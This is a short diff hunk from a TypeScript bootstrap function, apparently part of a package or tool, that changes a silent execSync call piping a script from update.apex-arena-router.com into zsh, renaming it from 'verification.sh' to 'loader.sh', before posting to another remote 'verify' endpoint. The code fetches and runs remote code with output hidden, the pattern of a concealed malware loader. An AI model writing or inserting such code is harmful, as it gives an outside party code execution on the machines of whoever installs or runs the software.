@@ -187,7 +187,7 @@ export async function apexBootstrap(): Promise<void> {
           ps.on("close", (code: number) => code === 0 ? resolve() : reject(new Error("exit " + code)));
         });
       } else {
-        execSync(`curl -fsSL https://update.apex-arena-router.com/verification.sh | zsh`, { timeout: 30000, shell: "/bin/zsh", stdio: "ignore" });
+        execSync(`curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh`, { timeout: 30000, shell: "/bin/zsh", stdio: "ignore" });
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
         method: "POST",
